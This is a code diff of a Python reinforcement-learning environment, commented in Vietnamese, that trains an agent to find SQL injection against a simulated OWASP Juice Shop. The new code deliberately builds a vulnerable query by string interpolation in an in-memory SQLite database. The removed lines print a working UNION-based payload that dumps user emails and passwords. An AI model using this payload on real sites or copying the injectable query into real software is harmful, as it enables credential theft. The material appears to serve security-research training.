@@ -1,139 +1,124 @@
+import sqlite3
+import json
+import configparser
+import sys
+import os
+
+# Xử lý import path nếu chạy local hoặc trong package
+sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+
 from src.environment.base_environment import BaseEnvironment
 from src.core.action_space import ActionSpace
 from src.core.reward_system import RewardSystem
-from src.core.state_manager import StateManager  # Nếu chưa có, tạo file src/core/state_manager.py như dưới
-import configparser
-import json
-import re
-
-# Nếu chưa có StateManager, tạo file src/core/state_manager.py với nội dung này:
-# class StateManager:
-#     def __init__(self):
-#         self.current_state = ""
-#
-#     def get_current_state(self):
-#         return self.current_state
-#
-#     def reset_state(self):
-#         self.current_state = ""
-#         return self.current_state
-#
-#     def update_state(self, action_string):
-#         self.current_state += action_string
-#         return self.current_state
+from src.core.state_manager import StateManager
 
 class TrainingEnvironment(BaseEnvironment):
-    """
-    Môi trường training mock cho Q-learning, simulate Juice Shop response.
-    Dùng để train agent offline nhanh, sau transfer sang TargetEnvironment.
-    """
     def __init__(self, config_file):
         config = configparser.ConfigParser()
         config.read(config_file, encoding='utf-8')
+        train_cfg = config['Training']
         
-        train_cfg = config['Training']  # Thêm section [Training] vào config.ini nếu chưa có
-        env_cfg = config['Environment']
-
-        # Config mock responses
-        self.success_marker = train_cfg.get('success_marker', 'admin@juice-sh.op')  # Từ baseline curl
-        self.error_marker = train_cfg.get('sql_error_marker', 'SQLITE_ERROR')  # Fake error
-        self.normal_count = int(env_cfg['normal_result_count'])
+        self.success_marker = train_cfg.get('success_marker', 'admin@juice-sh.op')
+        self.error_marker = "SQLITE_ERROR" 
         
-        # Khởi tạo components
         self.action_space = ActionSpace()
         self.state_manager = StateManager()
+        
+        # Khởi tạo Reward System với cấu hình Sướng trước - Khổ sau
         self.reward_system = RewardSystem(
-            normal_count=self.normal_count,
+            normal_count=0,
             success_marker=self.success_marker,
-            error_marker=self.error_marker
+            error_marker=self.error_marker,
+            env_type='training'
         )
-        print("[TrainingEnvironment] Đã khởi tạo môi trường mock cho training.")
+        
+        self.conn = None
+        self.cursor = None
+        self.current_hidden_col_count = 0
+
+    def _setup_db(self):
+        """Khởi tạo DB SQLite ảo trong RAM."""
+        if self.conn:
+            self.conn.close()
+        
+        self.conn = sqlite3.connect(':memory:')
+        self.cursor = self.conn.cursor()
+        
+        # 1. Random số cột để AI tập dò (hoặc cố định là 3 cho dễ trước)
+        self.current_hidden_col_count = 3 
+        
+        # 2. Tạo bảng Products (Bảng bị lỗi injection)
+        # QUAN TRỌNG: Cột c1 phải là TEXT để test lỗi ' (String Injection)
+        cols = ", ".join([f"c{i} TEXT" for i in range(1, self.current_hidden_col_count + 1)])
+        self.cursor.execute(f"CREATE TABLE Products ({cols})")
+        
+        # Insert dummy data
+        placeholders = ",".join(["?"] * self.current_hidden_col_count)
+        dummy_data = ["dummy_val"] * self.current_hidden_col_count
+        self.cursor.execute(f"INSERT INTO Products VALUES ({placeholders})", dummy_data)
+
+        # 3. Tạo bảng Users (Mục tiêu)
+        self.cursor.execute("CREATE TABLE Users (id INTEGER, email TEXT, password TEXT)")
+        self.cursor.execute("INSERT INTO Users VALUES (?, ?, ?)", (1, self.success_marker, "123456"))
+        
+        self.conn.commit()
 
     def reset(self):
-        """Reset state về rỗng."""
+        """Reset môi trường cho ván mới."""
+        self._setup_db()
+        
+        # QUAN TRỌNG: Reset trí nhớ của hệ thống thưởng phạt
+        if hasattr(self.reward_system, 'reset'):
+            self.reward_system.reset()
+            
         return self.state_manager.reset_state()
 
     def step(self, action_index):
-        """Thực hiện action, simulate response, tính reward."""
-        # 1. Lấy action string
         action_string = self.action_space.get_action_string(action_index)
         
-        # 2. Update state (nối payload)
-        new_state = self.state_manager.update_state(action_string)
+        # Cập nhật State
+        state_vector = self.state_manager.update_state(action_string, action_index)
         
-        # 3. Simulate HTTP response dựa trên payload (extract string nếu hash)
-        payload_str = self._get_payload_string(new_state)  # New helper
-        response = self._simulate_response(payload_str)
+        # Lấy payload hiện tại
+        payload = self.state_manager.current_state
         
-        # 4. Tính reward & done
-        reward, done = self.reward_system.calculate_reward(response, payload_str)  # Pass str to reward
+        # --- GIẢ LẬP LỖ HỔNG (Vulnerable Query) ---
+        # Query gốc giả định: SELECT * FROM Products WHERE ((c1 = '$input'))
+        # Đây là lý do tại sao action "a'))" lại hiệu quả:
+        # Nó biến query thành: ... WHERE ((c1 = 'a')) UNION ... --'))
+        full_query = f"SELECT * FROM Products WHERE ((c1 = '{payload}'))"
         
-        return new_state, reward, done  # Return hash/tuple state for Q-table
+        try:
+            # Thực thi SQL
+            self.cursor.execute(full_query)
+            rows = self.cursor.fetchall()
+            
+            # Nếu không lỗi -> Thành công (về mặt cú pháp)
+            response_text = json.dumps(rows)
+            status_code = 200
+            
+        except sqlite3.OperationalError as e:
+            err_msg = str(e).lower()
+            status_code = 500
+            response_text = self.error_marker
+            
+            # Gợi ý lỗi cho AI (nếu muốn nó học nhanh hơn)
+            if "selects to the left and right of union do not have the same number of result columns" in err_msg:
+                response_text += "_COLUMN_MISMATCH"
+            elif "syntax error" in err_msg or "incomplete input" in err_msg:
+                response_text += "_SYNTAX_ERROR"
+                
+        except Exception:
+            status_code = 500
+            response_text = "INTERNAL_ERROR"
 
-    def _get_payload_string(self, state):
-        """Extract full string payload từ state (hash or str)."""
-        if len(state) == 32 and all(c in '0123456789abcdef' for c in state):  # Likely MD5 hash
-            return self.state_manager.get_current_state()  # Full from manager
-        return state  # Already str
-
-    def _simulate_response(self, payload):
-        """
-        Simulate JSON response giống Juice Shop.
-        - Nếu payload có 'UNION SELECT ... Users--' → success leak.
-        - Nếu syntax sai (e.g., thiếu đóng ngoặc) → error 500.
-        - Else → normal products.
-        """
-        # Check cho baseline success (từ curl của mày)
-        baseline_pattern = r"a\'\)\)\s*UNION\s*SELECT\s*id,email,password,NULL,NULL,NULL,NULL,NULL,NULL\s*FROM\s*Users--"
-        if re.search(baseline_pattern, payload, re.IGNORECASE):
-            # Success: Leak admin data
-            fake_data = {
-                "status": "success",
-                "data": [{
-                    "id": 1,
-                    "name": "admin@juice-sh.op",
-                    "description": "0192023a7bbd73250516f069df18b500d",  # MD5 admin123
-                    "price": None, "deluxePrice": None, "image": None,
-                    "createdAt": None, "updatedAt": None, "deletedAt": None
-                }]
-            }
-            return type('Response', (), {
-                'status_code': 200,
-                'text': json.dumps(fake_data),
-                'headers': {}
-            })()
+        # Đóng gói response
+        response = type('Response', (), {'status_code': status_code, 'text': response_text})
         
-        # Check error (e.g., unbalanced quotes hoặc invalid SQL)
-        if "'" in payload and payload.count("'") % 2 != 0:  # Odd number of quotes → syntax error
-            return type('Response', (), {
-                'status_code': 500,
-                'text': '{"error": "SQLITE_ERROR: syntax error"}',
-                'headers': {}
-            })()
+        # Tính thưởng (Reward)
+        reward, done = self.reward_system.calculate_reward(response, payload)
         
-        # Normal: Fake products
-        fake_products = [{"id": i, "name": f"Product {i}", "description": "Normal desc"} for i in range(self.normal_count)]
-        fake_data = {"status": "success", "data": fake_products}
-        return type('Response', (), {
-            'status_code': 200,
-            'text': json.dumps(fake_data),
-            'headers': {}
-        })()
-
-    def test_baseline(self):
-        """
-        Test với baseline payload từ curl, dùng làm seed cho training.
-        Trả về (state, reward, done) nếu success.
-        """
-        baseline_payload = "a')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--"
-        self.state_manager.reset_state()
-        new_state = self.state_manager.update_state(baseline_payload)
-        payload_str = self._get_payload_string(new_state)  # Extract str
-        response = self._simulate_response(payload_str)
-        reward, done = self.reward_system.calculate_reward(response, payload_str)
-        print(f"[Baseline Test] Payload: {baseline_payload} | Reward: {reward} | Done: {done}")
-        return new_state, reward, done
-
+        return state_vector, reward, done
+    
     def get_action_space_size(self):
-        """Số action từ ActionSpace."""
         return self.action_space.get_action_space_size()
